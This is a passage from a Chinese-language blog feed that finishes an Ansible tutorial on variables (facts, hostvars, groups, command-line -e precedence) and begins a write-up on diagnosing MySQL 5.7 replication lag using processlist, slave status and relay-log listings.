&#123;</span><br><span class="line">        &quot;ansible_all_ipv4_addresses&quot;: [</span><br><span class="line">            &quot;10.0.4.230&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;ansible_default_ipv4&quot;: &#123;</span><br><span class="line">            &quot;address&quot;: &quot;10.0.4.230&quot;,</span><br><span class="line">            &quot;alias&quot;: &quot;eno16777736&quot;,</span><br><span class="line">            &quot;broadcast&quot;: &quot;10.0.4.255&quot;,</span><br><span class="line">            &quot;gateway&quot;: &quot;10.0.4.254&quot;,</span><br><span class="line">            &quot;interface&quot;: &quot;eno16777736&quot;,</span><br><span class="line">            &quot;macaddress&quot;: &quot;00:0c:29:dc:b1:c7&quot;,</span><br><span class="line">            &quot;mtu&quot;: 1500,</span><br><span class="line">            &quot;netmask&quot;: &quot;255.255.255.0&quot;,</span><br><span class="line">            &quot;network&quot;: &quot;10.0.4.0&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;ether&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;changed&quot;: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="内置变量"><a href="#内置变量" class="headerlink" title="内置变量"></a>内置变量</h3><p>Ansible会自动提供一些变量,即使你没有去定义他们.这些变量是ansible预留的.所以用户不应该手动定义重名的变量.比如下面这些:</p><ul><li><strong>hostvars</strong></li></ul><p>hostvars可以让你访问所有主机节点的fact信息.如果一台服务器想要访问另一个节点服务器的fact信息,这很有用.一般语法是:hostvars[‘inventory_hostname’][‘fact信息’]:例如下面的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim facttest.yml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"> - hosts: all</span><br><span class="line">   remote_user: root</span><br><span class="line">   gather_facts: True</span><br><span class="line">   tasks:</span><br><span class="line">     - name: print the fact varibale:ansible_distrubution</span><br><span class="line">       debug: var=hostvars[inventory_hostname][&apos;ansible_all_ipv4_addresses&apos;]</span><br></pre></td></tr></table></figure><p>执行结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook facttest.yml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TASK [print the fact varibale:ansible_distrubution] **************************************************************************************************************************************************************</span><br><span class="line">ok: [10.0.4.231] =&gt; &#123;</span><br><span class="line">    &quot;hostvars[inventory_hostname][&apos;ansible_all_ipv4_addresses&apos;]&quot;: [</span><br><span class="line">        &quot;10.0.4.231&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">ok: [10.0.4.230] =&gt; &#123;</span><br><span class="line">    &quot;hostvars[inventory_hostname][&apos;ansible_all_ipv4_addresses&apos;]&quot;: [</span><br><span class="line">        &quot;10.0.4.230&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>inventory_hostname</strong></li></ul><p>inventory_hostname是ansible识别的当前主机的主机名.如果是在hosts文件中定义过别名.比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beta ansible_ssh_host=10.0.0.250</span><br></pre></td></tr></table></figure><p>那么inventory_hostname就是beta</p><ul><li><strong>groups</strong></li></ul><p>当要访问一组主机的变量时,groups变量会很有用.比如一个模板文件需要知道一个test群组内所有服务器的IP地址.那么可以编辑这样一个模板配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for host in group.test %&#125;</span><br><span class="line">   server &#123;&#123; host.inventory_hostname &#125;&#125; &#123;&#123;host.ansible_default_ipv4.address&#125;&#125;:80</span><br><span class="line"> &#123;% endfor %&#125;</span><br><span class="line"> </span><br><span class="line"> 最终生成的配置文件如下:</span><br><span class="line"> server test1 10.0.4.230</span><br><span class="line"> server test2 10.0.4.231</span><br></pre></td></tr></table></figure><hr><h3 id="命令行输入变量"><a href="#命令行输入变量" class="headerlink" title="命令行输入变量"></a>命令行输入变量</h3><p>通过向ansible-playbook传递-e var=value参数可以像shell脚本那样使用Playbook.并且该参数的变量拥有最高优先级.例如下面的例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim greet.yml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">  - hosts: 10.0.4.230</span><br><span class="line">    vars:</span><br><span class="line">       greeting: &quot;hello&quot;</span><br><span class="line">    tasks:</span><br><span class="line">       - name: print greeting</span><br><span class="line">         debug: msg=&quot;&#123;&#123; greeting &#125;&#125;&quot;</span><br></pre></td></tr></table></figure><p>通过-e指定greeting变量执行playbook:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook greet.yml -e &apos;greeting=&quot;hello world&quot;&apos;</span><br><span class="line"></span><br><span class="line">TASK [print greeting] ******************************************************************************************************************************</span><br><span class="line">ok: [10.0.4.230] =&gt; &#123;</span><br><span class="line">    &quot;msg&quot;: &quot;hello world&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时greeting的变量值变成了”hello world” .而不是playbook中定义的”hello”</p><p>注意,如果变量包含空格,要把整个-e后面的参数用单引号括起来..否则就会得出意外的结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook greet.yml -e greeting=&quot;hello world&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TASK [print greeting] ******************************************************************************************************************************</span><br><span class="line">ok: [10.0.4.230] =&gt; &#123;</span><br><span class="line">    &quot;msg&quot;: &quot;hello&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外,-e选项不仅仅可以传递单个字符串,还能传递进一个包含变量的文件.比如下面的例子中,将greetvars.yml这整个文件传递进playbook:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook greet.yml -e @greetvars.yml</span><br></pre></td></tr></table></figure><hr><h3 id="变量优先级"><a href="#变量优先级" class="headerlink" title="变量优先级:"></a>变量优先级:</h3><p>1.命令行中使用-e参数手动指定</p><p>2.inventory主机文件,或者yaml文件定义的主机变量或者群组变量</p><p>3.FACT变量</p><p>4.role的default/main.yml文件定义的变量</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Ansible变量&quot;&gt;&lt;a href=&quot;#Ansible变量&quot; class=&quot;headerlink&quot; title=&quot;Ansible变量&quot;&gt;&lt;/a&gt;Ansible变量&lt;/h2&gt;&lt;p&gt;ansible有多重方式定义变量,还可以通过fact来获取变量.接下来学习一下ansibled 变量知识&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
      <category term="Ansible" scheme="https://jesse.top/categories/Ansible/"/>
    
    
      <category term="Ansible" scheme="https://jesse.top/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>mysql5.7主从同步延时问题</title>
    <link href="https://jesse.top/2018/08/22/mysql/mysql%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E5%BB%B6%E6%97%B6%E9%97%AE%E9%A2%98/"/>
    <id>https://jesse.top/2018/08/22/mysql/mysql主从同步延时问题/</id>
    <published>2018-08-22T03:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.298Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mysql主从同步延时问题"><a href="#mysql主从同步延时问题" class="headerlink" title="mysql主从同步延时问题"></a>mysql主从同步延时问题</h2><p>最近领导将MASTER的主库清空了最近几个月的数据,进行了大并发的操作.这导致了mysql的从库延时非常高的问题.zabbix报警如下:</p><p><img src="http://pabkmteb4.bkt.clouddn.com/mysql-monitor.png" alt="mysql-zabbix"></p><p>延时一直飙升到23个小时.</p><a id="more"></a> <h4 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h4><p>1.查看master库的慢查询条数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&quot;root@localhost:mysql.sock  [(none)]&gt;show processlist;</span><br><span class="line">+-----------+--------+----------------------+---------------+-------------+--------+---------------------------------------------------------------+------------------+</span><br><span class="line">| Id        | User   | Host                 | db            | Command     | Time   | State                                                         | Info             |</span><br><span class="line">+-----------+--------+----------------------+---------------+-------------+--------+---------------------------------------------------------------+------------------+</span><br><span class="line">                                                         | NULL             |</span><br><span class="line">| 285241295 | repl   | 10.8.0.6:60866       | NULL          | Binlog Dump | 319038 | Master has sent all binlog to slave; waiting for more updates | NULL             |</span><br><span class="line">| 285243495 | canal  | 10.25.2.85:42252     | NULL          | Binlog Dump | 319014 | Master has sent all binlog to slave; waiting for more updates | NULL             |</span><br><span class="line">| 290884712 | root   | 10.47.54.80:49170    | dwd_cron      | Sleep       |     68 |                                                               | NULL             |</span><br><span class="line">| 292617828 | tongji | 10.153.138.121:62821 | NULL          | Sleep       |      1 |                                                               | NULL             |</span><br><span class="line">| 292617838 | tongji | 10.153.138.121:62822 | NULL          | Sleep       |      2 |                                                               | NULL             |</span><br><span class="line">| 292617918 | tongji | 10.153.138.121:62872 | NULL          | Sleep       |      2 |                                                               | NULL             |</span><br><span class="line">| 300508313 | root   | 10.47.54.80:41858    | dwd_cron      | Sleep       |    194 |                                                               | NULL             |</span><br><span class="line">| 309403589 | root   | 10.47.54.80:42136    | dwd_cron      | Sleep       |    198 |                                                               | NULL             |</span><br><span class="line">| 309403590 | root   | 10.47.54.80:42138    | dwd_cron      | Sleep       |    198 |                                                               | NULL             |</span><br><span class="line">| 313939869 | root   | 10.25.2.85:40936     | hsq_online    | Sleep       |     11 |                                                               | NULL             |</span><br><span class="line">| 317005283 | root   | 10.25.2.85:34854     | hsq_online    | Sleep       |  27800 |                                                               | NULL             |                                                               | NULL             |</span><br><span class="line">| 319272252 | repl   | 10.27.3.27:35818     | NULL          | Binlog Dump |   3014 | Master has sent all binlog to slave; waiting for more updates | NULL             |</span><br><span class="line">                                                             | NULL             |</span><br><span class="line">+-----------+--------+----------------------+---------------+-------------+--------+---------------------------------------------------------------+------------------+</span><br><span class="line">118 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>只截取了部分数据..慢查询条数并不多,而且binlog也已经全部send到slave了..主库这边一切正常.</p><p>2.查看从库的状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show slave status\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting for master to send event</span><br><span class="line">                  Master_Host: 10.81.61.101</span><br><span class="line">                  Master_User: repl</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.005022</span><br><span class="line">          Read_Master_Log_Pos: 905366832</span><br><span class="line">               Relay_Log_File: server-6-relay-bin.004891</span><br><span class="line">                Relay_Log_Pos: 925220397</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.004927</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB: dwd_analystic,hsq_sync_RDS</span><br><span class="line">          Replicate_Ignore_DB:</span><br><span class="line">           Replicate_Do_Table:</span><br><span class="line">       Replicate_Ignore_Table:</span><br><span class="line">      Replicate_Wild_Do_Table:</span><br><span class="line">  Replicate_Wild_Ignore_Table:</span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error:</span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 925220184</span><br><span class="line">              Relay_Log_Space: 102979799744</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File:</span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File:</span><br><span class="line">           Master_SSL_CA_Path:</span><br><span class="line">              Master_SSL_Cert:</span><br><span class="line">            Master_SSL_Cipher:</span><br><span class="line">               Master_SSL_Key:</span><br><span class="line">        Seconds_Behind_Master: 84227</span><br><span class="line">Master_SSL_Verify_Server_Cert: No</span><br><span class="line">                Last_IO_Errno: 0</span><br><span class="line">                Last_IO_Error:</span><br><span class="line">               Last_SQL_Errno: 0</span><br><span class="line">               Last_SQL_Error:</span><br><span class="line">  Replicate_Ignore_Server_Ids:</span><br><span class="line">             Master_Server_Id: 63306</span><br></pre></td></tr></table></figure><p>除了Seconds_Behind_Master参数的值非常高以外也没有太大问题</p><p>3.查看从库的慢查询情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show processlist;</span><br><span class="line">+--------+-------------+----------------+--------------+---------+--------+----------------------------------+------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Id     | User        | Host           | db           | Command | Time   | State                            | Info  |</span><br><span class="line">+--------+-------------+----------------+--------------+---------+--------+----------------------------------+------------------------------------------------------------------------------------------------------+</span><br><span class="line">| 358262 | system user |                | NULL         | Connect | 319299 | Waiting for master to send event | NULL  |</span><br><span class="line">| 358263 | system user |                | NULL         | Connect |  84290 | System lock                      | NULL  |</span><br><span class="line">| 433117 | tongji      | server-5:53032 | hsq_sync_RDS | Query   |   1715 | Sending data                     | SELECT `id`, `user_id`, `buyer_id`, `order_ids`, `payment_method`, `trade_no`, `tn`, `third_party_no |</span><br><span class="line">| 433118 | tongji      | server-2:54130 | hsq_sync_RDS | Query   |   1714 | Sending data                     | SELECT `id`, `user_id`, `buyer_id`, `order_ids`, `payment_method`, `trade_no`, `tn`, `third_party_no |</span><br><span class="line">| 433119 | tongji      | server-1:34396 | hsq_sync_RDS | Query   |   1714 | Sending data                     | SELECT `id`, `user_id`, `buyer_id`, `order_ids`, `payment_method`, `trade_no`, `tn`, `third_party_no |</span><br><span class="line">| 433120 | tongji      | server-6:45128 | hsq_sync_RDS | Query   |   1712 | Sending data                     | SELECT `id`, `user_id`, `buyer_id`, `order_ids`, `payment_method`, `trade_no`, `tn`, `third_party_no |</span><br><span class="line">| 433181 | tongji      | server-1:34744 | hsq_sync_RDS | Query   |   1626 | Sending data                     | SELECT `id`, `user_id`, `password`, `last_login_ip`, `token`, `session`, `mobile`, `email`, `wechat_ |</span><br><span class="line">| 433206 | tongji      | server-6:45812 | hsq_sync_RDS | Query   |   1587 | Sending data                     | SELECT `id`, `order_id`, `user_id`, `delivery_no`, `delivery_com_code`, `delivery_com_name`, `status |</span><br><span class="line">| 433207 | tongji      | server-2:54888 | hsq_sync_RDS | Query   |   1587 | Sending data                     | SELECT `id`, `order_id`, `user_id`, `delivery_no`, `delivery_com_code`, `delivery_com_name`, `status |</span><br><span class="line">| 433208 | tongji      | server-4:47770 | hsq_sync_RDS | Query   |   1587 | Sending data                     | SELECT `id`, `order_id`, `user_id`, `delivery_no`, `delivery_com_code`, `delivery_com_name`, `status |</span><br><span class="line">| 433209 | tongji      | server-1:35058 | hsq_sync_RDS | Query   |   1586 | Sending data                     | SELECT `id`, `order_id`, `user_id`, `delivery_no`, `delivery_com_code`, `delivery_com_name`, `status |</span><br><span class="line">| 433246 | root        | localhost      | NULL         | Query   |      0 | starting                         | show processlist  |</span><br><span class="line">| 433373 | tongji      | server-6:47244 | hsq_sync_RDS | Query   |   1281 | Sending data                     | SELECT `id`, `user_id`, `password`, `last_login_ip`, `token`, `session`, `mobile`, `email`, `wechat_ |</span><br><span class="line">| 433505 | tongji      | server-1:38008 | hsq_sync_RDS | Query   |    797 | Sending data                     | SELECT `id`, `user_id`, `open_id`, `type`, `app_id`, `access_token`, `refresh_token`, `token_refresh |</span><br><span class="line">| 433506 | tongji      | server-5:34952 | hsq_sync_RDS | Query   |    797 | Sending data                     | SELECT `id`, `user_id`, `open_id`, `type`, `app_id`, `access_token`, `refresh_token`, `token_refresh |</span><br><span class="line">| 433508 | tongji      | server-3:33080 | hsq_sync_RDS | Query   |    796 | Sending data                     | SELECT `id`, `user_id`, `open_id`, `type`, `app_id`, `access_token`, `refresh_token`, `token_refresh |</span><br><span class="line">| 433977 | tongji      | server-3:38782 | hsq_sync_RDS | Query   |     53 | Sending data                     | SELECT `id`, `user_id`, `open_id`, `type`, `app_id`, `access_token`, `refresh_token`, `token_refresh |</span><br><span class="line">| 433982 | tongji      | server-3:38948 | hsq_sync_RDS | Query   |     40 | Sending data                     | SELECT `payment_id`, `order_id` FROM `trade_order_payment_map` AS `trade_order_payment_map` WHERE (  |</span><br><span class="line">| 433983 | tongji      | server-2:35990 | hsq_sync_RDS | Query   |     40 | Sending data                     | SELECT `payment_id`, `order_id` FROM `trade_order_payment_map` AS `trade_order_payment_map` WHERE (  |</span><br><span class="line">| 433984 | tongji      | server-6:53400 | hsq_sync_RDS | Query   |     40 | Sending data                     | SELECT `payment_id`, `order_id` FROM `trade_order_payment_map` AS `trade_order_payment_map` WHERE (  |</span><br><span class="line">| 433985 | tongji      | server-4:44578 | hsq_sync_RDS | Query   |     40 | Sending data                     | SELECT `payment_id`, `order_id` FROM `trade_order_payment_map` AS `trade_order_payment_map` WHERE (  |</span><br><span class="line">| 433986 | tongji      | server-3:38986 | hsq_sync_RDS | Query   |     38 | Sending data                     | SELECT `id`, `user_id`, `open_id`, `type`, `app_id`, `access_token`, `refresh_token`, `token_refresh |</span><br><span class="line">| 433997 | tongji      | server-2:36126 | hsq_sync_RDS | Query   |     23 | Sending data                     | SELECT `id`, `user_id`, `open_id`, `type`, `app_id`, `access_token`, `refresh_token`, `token_refresh |</span><br><span class="line">| 434019 | tongji      | server-6:53648 | hsq_sync_RDS | Sleep   |      0 |                                  | NULL  |</span><br><span class="line">+--------+-------------+----------------+--------------+---------+--------+----------------------------------+------------------------------------------------------------------------------------------------------+</span><br><span class="line">24 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>从库的select语句性能不是很好,</p><p>mysql数据文件目录存在大量的binlog日志.显然从库的数据写入有严重的滞后问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br></pre></td><td class="code"><pre><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 11:04 server-6-relay-bin.004893</span><br><span class="line">-rw-r----- 1 mysql mysql 1074907748 Aug 19 11:20 server-6-relay-bin.004894</span><br><span class="line">-rw-r----- 1 mysql mysql     326897 Aug 19 11:20 server-6-relay-bin.004895</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 11:20 server-6-relay-bin.004896</span><br><span class="line">-rw-r----- 1 mysql mysql 1073757574 Aug 19 11:35 server-6-relay-bin.004897</span><br><span class="line">-rw-r----- 1 mysql mysql    3014623 Aug 19 11:35 server-6-relay-bin.004898</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 11:35 server-6-relay-bin.004899</span><br><span class="line">-rw-r----- 1 mysql mysql 1073756933 Aug 19 11:50 server-6-relay-bin.004900</span><br><span class="line">-rw-r----- 1 mysql mysql       1981 Aug 19 11:50 server-6-relay-bin.004901</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 11:50 server-6-relay-bin.004902</span><br><span class="line">-rw-r----- 1 mysql mysql 1073755064 Aug 19 12:05 server-6-relay-bin.004903</span><br><span class="line">-rw-r----- 1 mysql mysql     461835 Aug 19 12:05 server-6-relay-bin.004904</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 12:05 server-6-relay-bin.004905</span><br><span class="line">-rw-r----- 1 mysql mysql 1074493379 Aug 19 12:20 server-6-relay-bin.004906</span><br><span class="line">-rw-r----- 1 mysql mysql       2579 Aug 19 12:20 server-6-relay-bin.004907</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 12:20 server-6-relay-bin.004908</span><br><span class="line">-rw-r----- 1 mysql mysql 1073750403 Aug 19 12:35 server-6-relay-bin.004909</span><br><span class="line">-rw-r----- 1 mysql mysql      38029 Aug 19 12:35 server-6-relay-bin.004910</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 12:35 server-6-relay-bin.004911</span><br><span class="line">-rw-r----- 1 mysql mysql 1073757889 